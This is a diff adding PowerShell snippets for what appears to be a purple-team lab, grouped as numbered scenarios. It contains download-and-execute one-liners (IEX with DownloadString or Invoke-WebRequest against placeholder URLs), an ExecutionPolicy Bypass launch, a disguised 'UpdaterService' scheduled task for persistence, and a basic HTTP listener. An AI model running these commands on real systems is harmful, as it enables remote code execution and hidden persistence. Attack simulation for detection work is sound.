@@ -1,0 +1,30 @@
+EX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
+IEX (Invoke-WebRequest <URL>).Content
+IEX (iwr <URL>).Content
+
+
+//Scenario 5 
+
+
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add(""http://*:80/"")
+$listener.Prefixes.Add(""http://*:8080/"")
+$listener.Start()
+
+while ($listener.IsListening) {
+    $context = $listener.GetContext()
+    $response = $context.Response
+    $buffer = [System.Text.Encoding]::UTF8.GetBytes(""Internal Service OK"")
+    $response.ContentLength64 = $buffer.Length
+    $response.OutputStream.Write($buffer, 0, $buffer.Length)
+    $response.OutputStream.Close()
+}
+
+
+//Scenario 3
+
+schtasks /create /sc minute /mo 30 /tn "UpdaterService" /tr "powershell.exe -File C:\PurpleLab\downloader.ps1"
+
+//Scenario 2
+Invoke-WebRequest -Uri "URL" downloader.ps1
+powershell.exe -ExecutionPolicy Bypass -File C:\PurpleLab\downloader.ps1
